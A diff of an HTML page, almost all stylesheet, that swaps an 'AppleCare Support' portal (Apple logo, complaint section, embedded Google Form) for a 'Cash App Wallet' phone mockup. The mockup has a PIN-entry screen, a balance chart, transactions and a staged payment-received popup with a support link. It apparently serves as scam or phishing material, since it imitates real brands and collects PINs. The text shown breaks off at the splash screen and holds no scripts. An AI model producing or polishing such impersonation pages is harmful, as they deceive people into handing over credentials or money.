@@ -1,3200 +1,1273 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>AppleCare Support</title>
+<title>Cash App Wallet</title>
 
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 17 20'%3E%3Cpath fill='black' d='M15.03 10.37c-.06-2.5 2.05-3.71 2.14-3.77-1.17-1.71-3-1.94-3.64-1.99-1.54-.16-3.02.91-3.8.91-.79 0-2.02-.89-3.32-.86-1.71.02-3.29.99-4.17 2.53-1.78 3.1-.45 7.68 1.27 10.16.84 1.21 1.83 2.57 3.14 2.52 1.26-.05 1.74-.81 3.26-.81 1.52 0 1.96.81 3.28.79 1.35-.02 2.22-1.23 3.05-2.44.96-1.4 1.35-2.76 1.37-2.83-.03-.02-2.64-1.01-2.68-4.01zm-2.4-6.84c.69-.84 1.15-2 1.02-3.16-1 .04-2.21.67-2.93 1.51-.64.74-1.2 1.92-1.05 3.06 1.12.09 2.27-.57 2.96-1.41z'/%3E%3C/svg%3E">
-
-<meta
-name="description"
-content="AppleCare Support Portal">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
 <style>
 
-/* ====================================
-RESET
-==================================== */
-
 *{
-margin:0;
-padding:0;
-box-sizing:border-box;
-}
-
-html{
-scroll-behavior:smooth;
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Inter',sans-serif;
 }
 
 body{
-
-font-family:
--apple-system,
-BlinkMacSystemFont,
-"SF Pro Display",
-"SF Pro Text",
-Helvetica,
-Arial,
-sans-serif;
-
-background:#f5f5f7;
-color:#1d1d1f;
-
-overflow-x:hidden;
-
+    background:#00d64f;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    overflow:hidden;
 }
 
-/* ====================================
-ROOT VARIABLES
-==================================== */
+/* APP */
 
-:root{
-
---apple-black:#1d1d1f;
---apple-secondary:#6e6e73;
-
---apple-blue:#0071e3;
---apple-blue-hover:#0077ed;
-
---apple-success:#34c759;
-
---apple-border:#d2d2d7;
-
---shadow:
-0 8px 30px rgba(0,0,0,.08);
-
+.app{
+    width:390px;
+    height:844px;
+    background:#f7f7f7;
+    border-radius:38px;
+    overflow:hidden;
+    position:relative;
+    box-shadow:
+    0 20px 60px rgba(0,0,0,.18);
 }
 
-/* ====================================
-HEADER
-==================================== */
+/* =========================
+   SPLASH SCREEN
+========================= */
 
-header{
+.splash{
+    position:absolute;
+    inset:0;
+    background:#00d64f;
+    z-index:9999;
 
-position:fixed;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
 
-top:0;
-left:0;
-
-width:100%;
-
-height:64px;
-
-background:
-rgba(255,255,255,.85);
-
-backdrop-filter:
-blur(20px);
-
-border-bottom:
-1px solid rgba(0,0,0,.06);
-
-z-index:9999;
-
+    transition:.5s ease;
 }
 
-.nav-container{
+.splash-logo{
+    width:110px;
+    height:110px;
+    border-radius:28px;
+    background:#fff;
 
-max-width:1400px;
+    display:flex;
+    justify-content:center;
+    align-items:center;
 
-margin:auto;
+    overflow:hidden;
 
-height:100%;
-
-display:flex;
-
-align-items:center;
-
-justify-content:space-between;
-
-padding:0 30px;
-
+    box-shadow:
+    0 10px 40px rgba(0,0,0,.12);
 }
 
-.logo-area{
-
-display:flex;
-
-align-items:center;
-
-gap:12px;
-
-text-decoration:none;
-
-color:#111;
-
-font-weight:700;
-
-font-size:22px;
-
+.splash-logo img{
+    width:72%;
+    height:72%;
+    object-fit:contain;
 }
 
-.apple-logo{
+.loader{
+    width:42px;
+    height:42px;
+    border-radius:50%;
 
-width:26px;
-height:32px;
+    border:3px solid rgba(255,255,255,.35);
+    border-top:3px solid #fff;
 
-fill:#111;
+    margin-top:34px;
 
+    animation:spin 1s linear infinite;
 }
 
-.nav-links{
-
-display:flex;
-
-align-items:center;
-
-gap:40px;
-
+@keyframes spin{
+    100%{
+        transform:rotate(360deg);
+    }
 }
 
-.mobile-menu{
-
-display:flex;
-
-align-items:center;
-
-justify-content:center;
-
+.loading-text{
+    margin-top:22px;
+    color:#fff;
+    font-size:15px;
+    font-weight:600;
+    letter-spacing:.2px;
 }
 
-.nav-links a{
+/* =========================
+   PIN SCREEN
+========================= */
 
-text-decoration:none;
+.pin-screen{
+    position:absolute;
+    inset:0;
+    background:#00d64f;
 
-color:#6e6e73;
+    z-index:9998;
 
-font-size:13px;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
 
-font-weight:500;
+    opacity:0;
+    pointer-events:none;
 
-transition:.25s;
-
+    transition:.5s ease;
 }
 
-.nav-links a:hover{
-
-color:var(--apple-blue);
-
+.pin-title{
+    color:#fff;
+    font-size:26px;
+    font-weight:800;
+    margin-bottom:38px;
 }
 
-.support-button{
-
-background:var(--apple-blue);
-
-padding:10px 18px;
-
-border-radius:999px;
-
-color:#fff !important;
-
+.pin-dots{
+    display:flex;
+    gap:18px;
 }
 
-/* ====================================
-MOBILE MENU
-==================================== */
+.dot{
+    width:20px;
+    height:20px;
+    border-radius:50%;
+    background:rgba(255,255,255,.25);
 
-.mobile-menu{
-
-display:none;
-
-cursor:pointer;
-
+    transition:.25s ease;
 }
 
-.mobile-menu svg{
-
-width:28px;
-height:28px;
-
+.dot.active{
+    background:#fff;
+    transform:scale(1.08);
 }
 
-/* ====================================
-HERO
-==================================== */
+/* =========================
+   MAIN PAGE
+========================= */
 
-.hero{
+.main{
+    position:absolute;
+    inset:0;
 
-padding-top:150px;
+    background:#f7f7f7;
 
-padding-bottom:120px;
+    transform:translateY(40px);
+    opacity:0;
 
-text-align:center;
+    transition:.7s cubic-bezier(.2,.8,.2,1);
 
-max-width:1200px;
-
-margin:auto;
-
-padding-left:24px;
-padding-right:24px;
-
+    overflow-y:auto;
+    overflow-x:hidden;
+    padding-bottom:120px; /* keeps last transactions above bottom nav */
+    -webkit-overflow-scrolling:touch;
 }
 
-.hero-badge{
+/* STATUS */
 
-display:inline-flex;
+.status{
+    height:54px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:0 24px;
 
-align-items:center;
-
-gap:10px;
-
-background:#fff;
-
-padding:12px 22px;
-
-border-radius:999px;
-
-border:
-1px solid var(--apple-border);
-
-box-shadow:var(--shadow);
-
-margin-bottom:35px;
-
-font-size:14px;
-
-font-weight:600;
-
+    color:#000;
+    font-size:14px;
+    font-weight:700;
 }
 
-.status-dot{
+/* TOPBAR */
 
-width:10px;
-height:10px;
+.topbar{
+    padding:8px 22px 0;
 
-border-radius:50%;
-
-background:var(--apple-success);
-
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
 }
 
-.hero h1{
+/* LOGO */
 
-font-size:
-clamp(52px,8vw,92px);
+.logo{
+    width:50px;
+    height:50px;
+    border-radius:16px;
+    background:#00d64f;
 
-font-weight:600;
+    display:flex;
+    justify-content:center;
+    align-items:center;
 
-line-height:1.05;
-
-letter-spacing:-1px;
-
-margin-bottom:24px;
-
+    overflow:hidden;
 }
 
-.hero p{
-
-max-width:850px;
-
-margin:auto;
-
-font-size:22px;
-
-line-height:1.8;
-
-color:var(--apple-secondary);
-
-margin-bottom:40px;
-
+.logo img{
+    width:72%;
+    height:72%;
+    object-fit:contain;
 }
 
-/* ====================================
-BUTTONS
-==================================== */
+/* PROFILE */
 
-.hero-buttons{
+.profile{
+    width:44px;
+    height:44px;
+    border-radius:50%;
 
-display:flex;
+    background:#fff;
 
-justify-content:center;
+    border:1px solid #ececec;
 
-gap:18px;
+    display:flex;
+    justify-content:center;
+    align-items:center;
 
-flex-wrap:wrap;
-
+    font-size:18px;
 }
 
-.btn-primary{
+/* HEADER */
 
-background:var(--apple-blue);
-
-color:white;
-
-text-decoration:none;
-
-padding:16px 34px;
-
-border-radius:999px;
-
-font-size:17px;
-
-font-weight:600;
-
+.header{
+    padding:14px 24px 10px;
 }
 
-.btn-secondary{
+/* CHART */
 
-background:#fff;
-
-border:
-1px solid var(--apple-border);
-
-color:#1d1d1f;
-
-text-decoration:none;
-
-padding:16px 34px;
-
-border-radius:999px;
-
-font-size:17px;
-
-font-weight:600;
-
+.mini-chart{
+    margin-top:6px;
+    background:#fff;
+    border-radius:30px;
+    padding:22px;
+    border:1px solid #ececec;
 }
 
-/* ====================================
-SECTIONS
-==================================== */
+.chart-top{
+    display:flex;
+    justify-content:space-between;
+    align-items:flex-start;
+    margin-bottom:14px;
+}
+
+.chart-balance{
+    font-size:34px;
+    font-weight:800;
+    letter-spacing:-1px;
+    color:#000;
+}
+
+.chart-growth{
+    margin-top:6px;
+    color:#00c94a;
+    font-size:14px;
+    font-weight:700;
+}
+
+.chart-pill{
+    background:#e8fff0;
+    color:#00c94a;
+    padding:8px 14px;
+    border-radius:999px;
+    font-size:12px;
+    font-weight:800;
+}
+
+.chart-svg{
+    width:100%;
+    height:120px;
+    display:block;
+}
+
+/* CTA */
+
+.cta{
+    margin:0 24px 24px;
+    background:#00d64f;
+    border-radius:30px;
+    padding:18px;
+    color:#fff;
+    position:relative;
+    overflow:hidden;
+}
+
+.cta::after{
+    content:"";
+    position:absolute;
+    right:-40px;
+    top:-40px;
+
+    width:160px;
+    height:160px;
+
+    border-radius:50%;
+
+    background:rgba(255,255,255,.12);
+}
+
+.cta-title{
+    font-size:20px;
+    font-weight:700;
+    position:relative;
+    z-index:2;
+}
+
+.cta-sub{
+    margin-top:8px;
+    font-size:14px;
+    line-height:1.5;
+    width:75%;
+
+    color:rgba(255,255,255,.92);
+
+    position:relative;
+    z-index:2;
+}
+
+.cta-btn{
+    margin-top:18px;
+    display:inline-flex;
+    align-items:center;
+    gap:10px;
+
+    background:#fff;
+    color:#000;
+
+    padding:14px 20px;
+
+    border-radius:999px;
+
+    text-decoration:none;
+
+    font-size:15px;
+    font-weight:700;
+
+    position:relative;
+    z-index:2;
+}
+
+/* SECTION */
 
 .section{
+    padding:0 24px;
+}
 
-padding:70px 24px;
-
+.section-head{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:18px;
 }
 
 .section-title{
-
-text-align:center;
-
-margin-bottom:35px;
-
-}
-
-.section-title h2{
-
-font-size:
-clamp(40px,5vw,64px);
-
-letter-spacing:-2px;
-
-margin-bottom:15px;
-
-}
-
-.section-title p{
-
-max-width:850px;
-
-margin:auto;
-
-font-size:21px;
-
-line-height:1.6;
-
-color:var(--apple-secondary);
-
-}
-
-.section-title{
-
-max-width:900px;
-
-margin:0 auto 60px;
-
-}
-
-/* ====================================
-DEVICE PANEL
-==================================== */
-
-.device-panel{
-
-max-width:1100px;
-
-margin:0 auto 40px;
-
-padding:0 24px;
-
-}
-
-.device-card{
-
-background:#fff;
-
-padding:35px;
-
-border-radius:28px;
-
-box-shadow:var(--shadow);
-
-}
-
-.device-grid{
-
-display:grid;
-
-grid-template-columns:
-repeat(3,1fr);
-
-gap:25px;
-
-}
-
-.device-box{
-
-background:#fafafa;
-
-padding:24px;
-
-border-radius:18px;
-
-text-align:center;
-
-}
-
-.device-title{
-
-font-size:13px;
-
-text-transform:uppercase;
-
-letter-spacing:1px;
-
-color:#86868b;
-
-margin-bottom:10px;
-
-}
-
-.device-value{
-
-font-size:22px;
-
-font-weight:700;
-
-}
-
-/* ====================================
-STATUS GRID
-==================================== */
-
-.live-status{
-
-max-width:1400px;
-
-margin:auto;
-
-display:grid;
-
-grid-template-columns:
-repeat(4,1fr);
-
-gap:24px;
-
-}
-
-.status-card{
-
-background:#fff;
-
-padding:30px;
-
-border-radius:24px;
-
-box-shadow:var(--shadow);
-
-text-align:center;
-
-}
-
-.status-number{
-
-font-size:44px;
-
-font-weight:700;
-
-margin-bottom:10px;
-
-}
-
-.status-label{
-
-font-size:15px;
-
-color:var(--apple-secondary);
-
-}
-
-/* ====================================
-SUPPORT GRID
-==================================== */
-
-.support-grid{
-
-max-width:1100px;
-
-margin:auto;
-
-display:grid;
-
-grid-template-columns:
-repeat(3,minmax(0,1fr));
-
-gap:24px;
-
-}
-
-.support-card{
-
-background:white;
-
-border-radius:30px;
-
-padding:34px;
-
-box-shadow:
-0 8px 30px rgba(0,0,0,.08);
-
-border:
-1px solid rgba(0,0,0,.05);
-
-transition:.35s;
-
-position:relative;
-
-overflow:hidden;
-
-}
-
-@media(max-width:768px){
-
-.support-card{
-
-padding:24px;
-
-border-radius:22px;
-
-}
-
-.support-card h3{
-
-font-size:22px;
-
-}
-
-}
-
-
-.support-card:hover{
-
-transform:
-translateY(-8px);
-
-}
-
-.support-card::before{
-
-content:"";
-
-position:absolute;
-
-top:0;
-left:0;
-
-width:100%;
-height:5px;
-
-background:#0071e3;
-
-}
-
-.support-icon{
-
-width:72px;
-height:72px;
-
-margin:0 auto 22px;
-
-display:flex;
-align-items:center;
-justify-content:center;
-
-border-radius:22px;
-
-background:
-linear-gradient(
-145deg,
-rgba(255,255,255,.95),
-rgba(245,245,247,.75)
-);
-
-backdrop-filter:blur(18px);
-
--webkit-backdrop-filter:blur(18px);
-
-border:1px solid rgba(255,255,255,.7);
-
-box-shadow:
-0 8px 20px rgba(0,0,0,.08),
-inset 0 1px 0 rgba(255,255,255,.9);
-
-transition:.35s;
-}
-
-.support-card:hover .support-icon{
-
-transform:translateY(-4px) scale(1.08);
-
-box-shadow:
-0 14px 28px rgba(0,0,0,.12),
-0 0 18px rgba(0,113,227,.15);
-
-}
-
-.support-icon svg{
-
-width:60px;
-height:60px;
-
-color:#6E6E73;
-
-fill:currentColor;
-
-}
-
-.support-card h3{
-
-font-size:26px;
-
-margin-bottom:12px;
-
-}
-
-.support-card p{
-
-font-size:16px;
-
-line-height:1.7;
-
-color:#6e6e73;
-
-margin-bottom:24px;
-
-}
-
-.support-action{
-
-margin-top:auto;
-
-display:flex;
-
-justify-content:center;
-
-}
-
-.support-action span{
-
-display:flex;
-
-align-items:center;
-
-justify-content:center;
-
-gap:10px;
-
-width:100%;
-
-padding:14px 18px;
-
-border-radius:14px;
-
-background:linear-gradient(
-180deg,
-#007AFF,
-#0063CC
-);
-
-color:#fff;
-
-font-size:15px;
-
-font-weight:600;
-
-letter-spacing:.2px;
-
-box-shadow:
-0 8px 18px rgba(0,122,255,.22);
-
-transition:.3s ease;
-
-cursor:pointer;
-
-user-select:none;
-
-}
-
-.support-card:hover .support-action span{
-
-transform:translateY(-2px);
-
-box-shadow:
-0 14px 28px rgba(0,122,255,.30);
-
-background:linear-gradient(
-180deg,
-#1A8CFF,
-#0069D9
-);
-
-}
-
-/* ====================================
-SECURITY
-==================================== */
-
-.security-wrapper{
-
-max-width:1400px;
-
-margin:auto;
-
-display:grid;
-
-grid-template-columns:
-repeat(3,1fr);
-
-gap:30px;
-
-}
-
-.security-card{
-
-background:white;
-
-padding:35px;
-
-border-radius:28px;
-
-box-shadow:
-0 8px 30px rgba(0,0,0,.08);
-
-text-align:center;
-
-}
-
-.security-card svg{
-
-width:54px;
-height:54px;
-
-fill:#0071e3;
-
-margin-bottom:18px;
-
-}
-
-.security-card h3{
-
-font-size:24px;
-
-margin-bottom:12px;
-
-}
-
-.security-card p{
-
-font-size:15px;
-
-line-height:1.65;
-
-color:#6e6e73;
-
-}
-
-/* ====================================
-APPLECARE BOX
-==================================== */
-
-.applecare-box{
-
-max-width:1400px;
-
-margin:auto;
-
-background:white;
-
-padding:60px;
-
-border-radius:40px;
-
-box-shadow:
-0 8px 30px rgba(0,0,0,.08);
-
-display:grid;
-
-grid-template-columns:
-1fr 1fr;
-
-gap:60px;
-
-}
-
-.applecare-content h3{
-
-font-size:48px;
-
-letter-spacing:-2px;
-
-margin-bottom:25px;
-
-}
-
-.applecare-content p{
-
-font-size:18px;
-
-line-height:1.8;
-
-color:#6e6e73;
-
-margin-bottom:20px;
-
-}
-
-/* ====================================
-FEATURE LIST
-==================================== */
-
-.feature-list{
-
-display:grid;
-
-font-size:15px;
-
-line-height:1.9;
-
-gap:18px;
-
-margin-top:30px;
-
-}
-
-.feature-item{
-
-display:flex;
-
-align-items:center;
-
-gap:14px;
-
-font-size:18px;
-
-font-weight:500;
-
-}
-
-.feature-item svg{
-
-width:24px;
-height:24px;
-
-fill:#34c759;
-
-}
-
-/* ====================================
-FOOTER
-==================================== */
-
-footer{
-
-margin-top:120px;
-
-background:white;
-
-border-top:
-1px solid rgba(0,0,0,.06);
-
-padding:80px 24px;
-
-}
-
-.footer-container{
-
-max-width:1400px;
-
-margin:auto;
-
-}
-
-.footer-top{
-
-display:flex;
-
-justify-content:space-between;
-
-align-items:center;
-
-flex-wrap:wrap;
-
-gap:30px;
-
-margin-bottom:50px;
-
-}
-
-.footer-logo{
-
-display:flex;
-
-align-items:center;
-
-gap:12px;
-
-font-size:26px;
-
-font-weight:700;
-
-}
-
-.footer-links{
-
-display:flex;
-
-gap:30px;
-
-flex-wrap:wrap;
-
-}
-
-.footer-links a{
-
-text-decoration:none;
-
-color:#6e6e73;
-
-font-size:15px;
-
-}
-
-.footer-links a:hover{
-
-color:#0071e3;
-
-}
-
-.footer-bottom{
-
-padding-top:30px;
-
-border-top:
-1px solid rgba(0,0,0,.05);
-
-display:flex;
-
-justify-content:space-between;
-
-align-items:center;
-
-flex-wrap:wrap;
-
-gap:20px;
-
-}
-
-.footer-bottom p{
-
-font-size:14px;
-
-color:#86868b;
-
-}
-
-/* ====================================
-COMPLAINT SECTION
-==================================== */
-
-.feature-grid{
-
-max-width:1400px;
-
-margin:auto;
-
-display:grid;
-
-grid-template-columns:1fr 1fr;
-
-gap:30px;
-
-}
-
-.feature-panel{
-
-position:relative;
-
-overflow:hidden;
-
-border-radius:40px;
-
-padding:70px;
-
-min-height:420px;
-
-display:flex;
-
-flex-direction:column;
-
-justify-content:center;
-
-box-shadow:var(--shadow);
-
-}
-
-.feature-panel.light{
-
-background:white;
-
-}
-
-.feature-panel.dark{
-
-background:black;
-
-color:white;
-
-}
-
-.feature-label{
-
-font-size:18px;
-
-font-weight:600;
-
-margin-bottom:25px;
-
-opacity:.8;
-
-}
-
-.feature-panel h2{
-
-font-size:64px;
-
-line-height:1.05;
-
-letter-spacing:-2px;
-
-margin-bottom:25px;
-
-}
-
-.feature-panel p{
-
-font-size:24px;
-
-line-height:1.6;
-
-max-width:700px;
-
-opacity:.9;
-
-}
-
-.feature-number{
-
-position:absolute;
-
-right:40px;
-
-bottom:10px;
-
-font-size:220px;
-
-font-weight:700;
-
-opacity:.04;
-
-pointer-events:none;
-
-}
-
-.feature-btn{
-
-margin-top:40px;
-
-display:inline-block;
-
-width:max-content;
-
-padding:16px 34px;
-
-border-radius:999px;
-
-text-decoration:none;
-
-font-weight:600;
-
-}
-
-.feature-panel.light .feature-btn{
-
-background:#0071e3;
-
-color:white;
-
-}
-
-.feature-panel.dark .feature-btn{
-
-background:white;
-
-color:black;
-
-}
-
-/* TRUST */
-
-.trust-grid{
-
-max-width:1400px;
-
-margin:auto;
-
-display:grid;
-
-grid-template-columns:repeat(4,1fr);
-
-gap:24px;
-
-}
-
-.trust-card{
-
-background:#f2f2f7;
-
-border-radius:30px;
-
-padding:40px;
-
-text-align:center;
-
-}
-
-.trust-icon{
-
-font-size:70px;
-
-margin-bottom:20px;
-
-}
-
-.trust-card h3{
-
-font-size:24px;
-
-}
-
-/* GOOGLE FORM */
-
-.form-wrapper{
-
-max-width:1200px;
-
-margin:auto;
-
-padding:30px;
-
-border-radius:36px;
-
-background:linear-gradient(
-145deg,
-rgba(255,255,255,.92),
-rgba(248,248,250,.82)
-);
-
-backdrop-filter:blur(22px);
-
--webkit-backdrop-filter:blur(22px);
-
-border:1px solid rgba(255,255,255,.75);
-
-box-shadow:
-0 25px 60px rgba(0,0,0,.08),
-inset 0 1px 0 rgba(255,255,255,.9);
-
-overflow:hidden;
-
-}
-
-.google-form-frame{
-
-width:100%;
-
-height:1400px;
-
-border:none;
-
-border-radius:24px;
-
-background:white;
-
-box-shadow:
-0 10px 35px rgba(0,0,0,.08);
-
-}
-
-.form-header{
-
-text-align:center;
-
-margin-bottom:30px;
-
-}
-
-.form-badge{
-
-display:inline-flex;
-
-align-items:center;
-
-gap:8px;
-
-padding:10px 18px;
-
-border-radius:999px;
-
-background:rgba(0,122,255,.08);
-
-color:#007AFF;
-
-font-size:14px;
-
-font-weight:600;
-
-margin-bottom:20px;
-
-}
-
-.form-header h3{
-
-font-size:34px;
-
-font-weight:700;
-
-letter-spacing:-1px;
-
-margin-bottom:12px;
-
-color:#1d1d1f;
-
-}
-
-.form-header p{
-
-max-width:650px;
-
-margin:auto;
-
-font-size:17px;
-
-line-height:1.7;
-
-color:#6e6e73;
-
-}
-
-
-/* MOBILE */
-
-@media(max-width:1200px){
-
-.applecare-box{
-grid-template-columns:1fr;
-}
-
-.security-wrapper{
-grid-template-columns:1fr;
-}
-
-.live-status{
-grid-template-columns:repeat(2,1fr);
-}
-
-.device-grid{
-grid-template-columns:1fr;
-}
-
-.support-grid{
-grid-template-columns:repeat(2,1fr);
-}
-
-}
-
-@media(max-width:900px){
-
-.nav-links{
-display:none;
-}
-
-.mobile-menu{
-display:block;
-}
-
-
-.feature-panel{
-padding:40px;
-min-height:auto;
-}
-
-.feature-panel h2{
-font-size:36px;
-line-height:1.1;
-}
-
-.feature-panel p{
-font-size:18px;
-}
-
-.feature-number{
-font-size:120px;
-}
-
-.hero h1{
-font-size:clamp(38px,10vw,92px);
-line-height:1.05;
-letter-spacing:-1.5px;
-}
-
-.hero p{
-font-size:19px;
-}
-
-}
-
-@media(max-width:768px){
-
-.hero h1{
-font-size:44px;
-}
-
-.section-title h2{
-font-size:34px;
-}
-
-.support-card h3{
-font-size:20px;
-}
-
-.support-card p{
-font-size:14px;
-}
-
-.section{
-padding:70px 18px;
-}
-
-.support-grid{
-grid-template-columns:1fr;
-}
-
-.trust-grid{
-grid-template-columns:1fr 1fr;
-gap:14px;
-}
-
-.trust-card{
-padding:22px;
-}
-
-.google-form-frame{
-height:1700px;
-}
-
-.form-wrapper{
-
-padding:18px;
-
-border-radius:24px;
-
-}
-
-.form-header h3{
-
-font-size:28px;
-
-}
-
-.form-header p{
-
-font-size:15px;
-
-}
-
-
-.support-card{
-
-background:white;
-
-border-radius:30px;
-
-padding:34px;
-
-display:flex;
-
-flex-direction:column;
-
-justify-content:flex-start;
-
-box-shadow:
-0 8px 30px rgba(0,0,0,.08);
-
-border:
-1px solid rgba(0,0,0,.05);
-
-transition:.35s;
-
-position:relative;
-
-overflow:hidden;
-
-height:100%;
-
+    font-size:21px;
+    font-weight:800;
+    color:#000;
 }
 
-.feature-list{
-grid-template-columns:1fr;
+.see-all{
+    font-size:14px;
+    font-weight:700;
+    color:#00c94a;
 }
 
-}
-
-@media(max-width:600px){
+/* ACTIVITY */
 
-.live-status{
-grid-template-columns:1fr;
+.activity-card{
+    background:#fff;
+    border-radius:28px;
+    padding:8px 18px;
+    border:1px solid #ededed;
 }
 
-.hero-buttons{
-flex-direction:column;
-}
+/* ITEM */
 
-.btn-primary,
-.btn-secondary{
-width:100%;
-}
+.item{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
 
-.applecare-box{
-padding:35px;
-}
+    padding:18px 0;
 
-.trust-grid{
-grid-template-columns:1fr;
+    border-bottom:1px solid #f1f1f1;
 }
 
-.google-form-frame{
-height:2000px;
+.item:last-child{
+    border:none;
 }
 
+.item-left{
+    display:flex;
+    align-items:center;
+    gap:14px;
 }
-/* ====================================
-ANIMATIONS
-==================================== */
-
-.fade-up{
 
-opacity:0;
+/* ICON */
 
-transform:
-translateY(50px);
+.icon{
+    width:54px;
+    height:54px;
+    border-radius:18px;
 
-transition:
-all .8s ease;
+    display:flex;
+    justify-content:center;
+    align-items:center;
 
+    font-size:20px;
+    font-weight:700;
 }
-
-.fade-up.active{
-
-opacity:1;
 
-transform:
-translateY(0);
-
+.green{
+    background:#e8fff0;
+    color:#00c94a;
 }
-
-.glow{
 
-animation:
-pulseGlow 3s infinite;
-
+.black{
+    background:#101010;
+    color:#fff;
 }
-
-@keyframes pulseGlow{
 
-0%{
-
-box-shadow:
-0 0 0 rgba(0,113,227,.10);
-
+.soft{
+    background:#f2f2f2;
+    color:#111;
 }
 
-50%{
+/* TEXT */
 
-box-shadow:
-0 0 40px rgba(0,113,227,.18);
-
+.name{
+    font-size:16px;
+    font-weight:700;
+    color:#000;
 }
-
-100%{
 
-box-shadow:
-0 0 0 rgba(0,113,227,.10);
-
+.time{
+    margin-top:5px;
+    font-size:13px;
+    color:#8a8a8a;
 }
 
+.amount{
+    font-size:18px;
+    font-weight:800;
 }
-
-/* ====================================
-RESPONSIVE
-==================================== */
 
-@media(max-width:1200px){
-
-.applecare-box{
-grid-template-columns:1fr;
+.plus{
+    color:#00c94a;
 }
 
-.security-wrapper{
-grid-template-columns:1fr;
+.minus{
+    color:#000;
 }
 
-.live-status{
-grid-template-columns:
-repeat(2,1fr);
-}
+/* NAV */
 
-.device-grid{
-grid-template-columns:1fr;
-}
+.nav{
+    position:absolute;
+    left:0;
+    right:0;
+    bottom:0;
 
-}
+    background:#fff;
+    border-top:1px solid #ececec;
 
-@media(max-width:900px){
+    display:flex;
+    justify-content:space-around;
 
-.nav-links{
-display:none;
-}
+    padding:16px 0 28px;
 
-.mobile-menu{
-display:block;
+    z-index:100;
 }
-
-.hero h1{
 
-font-size:
-clamp(38px,10vw,92px);
+.nav-item{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:7px;
 
-line-height:1.05;
+    font-size:12px;
+    font-weight:600;
 
-letter-spacing:-1.5px;
-
+    color:#9a9a9a;
 }
 
-.hero p{
-font-size:19px;
+.nav-item.active{
+    color:#00c94a;
 }
-
-/* SUPPORT GRID */
-
-.support-grid{
-
-max-width:1100px;
 
-margin:auto;
-
-display:grid;
-
-grid-template-columns:
-repeat(3,minmax(0,1fr));
-
-gap:24px;
-
+.nav-icon{
+    font-size:22px;
 }
 
-/* TABLET */
-
-@media(max-width:1100px){
-
-.support-grid{
-
-grid-template-columns:
-repeat(2,1fr);
-
-}
+/* SHOW MAIN */
 
+.main.show{
+    transform:translateY(0);
+    opacity:1;
 }
 
 /* MOBILE */
 
-@media(max-width:768px){
+@media(max-width:430px){
 
-.support-grid{
+    body{
+        background:#f7f7f7;
+    }
 
-grid-template-columns:1fr;
-
-}
-
-.section{
-padding:70px 18px;
-}
-
-}
-
-/* SMALL MOBILE */
-
-@media(max-width:600px){
-
-.live-status{
-grid-template-columns:1fr;
-}
-
-.hero-buttons{
-flex-direction:column;
-}
-
-.btn-primary,
-.btn-secondary{
-width:100%;
-}
-
-.applecare-box{
-padding:35px;
-}
+    .app{
+        width:100%;
+        height:100vh;
+        border-radius:0;
+    }
 
 }
 
-/* IPAD */
+/* =========================
+   POPUP
+========================= */
 
-@media(min-width:769px) and (max-width:1180px){
+/* =========================
+   POPUP
+========================= */
 
-.feature-grid{
-grid-template-columns:1fr;
+.popup-wrap{
+    position:absolute;
+
+    top:126px;
+    left:24px;
+    right:24px;
+
+    z-index:999;
+
+    opacity:0;
+    pointer-events:none;
+
+    transform:
+    translateY(-24px)
+    scale(.92);
+
+    transition:.5s cubic-bezier(.2,.8,.2,1);
 }
 
-.security-wrapper{
-grid-template-columns:1fr;
+.popup-wrap.show{
+    opacity:1;
+    pointer-events:auto;
+
+    transform:
+    translateY(0)
+    scale(1);
 }
 
+.popup-card{
+
+    background:
+    rgba(255,255,255,.94);
+
+    backdrop-filter:blur(18px);
+
+    border-radius:32px;
+
+    padding:22px;
+
+    border:
+    1px solid rgba(255,255,255,.7);
+
+    box-shadow:
+    0 30px 80px rgba(0,0,0,.16),
+    0 10px 30px rgba(0,0,0,.08);
+
+    position:relative;
+
+    overflow:hidden;
 }
 
+.popup-card::after{
 
+    content:"";
+
+    position:absolute;
+
+    width:180px;
+    height:180px;
+
+    border-radius:50%;
+
+    background:
+    radial-gradient(
+        rgba(0,214,79,.12),
+        transparent
+    );
+
+    top:-80px;
+    right:-60px;
+
+    pointer-events:none;
+}
+
+.popup-badge{
+    display:inline-flex;
+
+    background:#e8fff0;
+
+    color:#00c94a;
+
+    padding:8px 14px;
+
+    border-radius:999px;
+
+    font-size:11px;
+    font-weight:800;
+}
+
+.popup-amount{
+    margin-top:16px;
+
+    font-size:30px;
+    font-weight:800;
+
+    letter-spacing:-1px;
+
+    color:#000;
+}
+
+.popup-user{
+    margin-top:4px;
+
+    font-size:17px;
+    font-weight:700;
+
+    color:#000;
+}
+
+.popup-time{
+    margin-top:6px;
+
+    color:#8e8e93;
+
+    font-size:13px;
+}
+
+.popup-btn{
+    width:100%;
+
+    margin-top:18px;
+
+    border:none;
+
+    background:#00d64f;
+    color:#fff;
+
+    padding:15px;
+
+    border-radius:16px;
+
+    font-size:14px;
+    font-weight:700;
+
+    cursor:pointer;
+}
+
+.popup-support{
+    display:flex;
+    justify-content:center;
+
+    margin-top:12px;
+
+    text-decoration:none;
+
+    color:#00c94a;
+
+    font-size:13px;
+    font-weight:700;
+}
 
 </style>
-
 </head>
 
 <body>
 
-<header>
+<div class="app">
 
-<div class="nav-container">
+    <!-- SPLASH -->
 
-<a href="#" class="logo-area">
+    <div class="splash" id="splash">
 
-<svg class="apple-logo" viewBox="0 0 814 1000">
+        <div class="splash-logo">
+            <img src="https://i.ibb.co/Wp269Dqq/vdfgvfg.png">
+        </div>
 
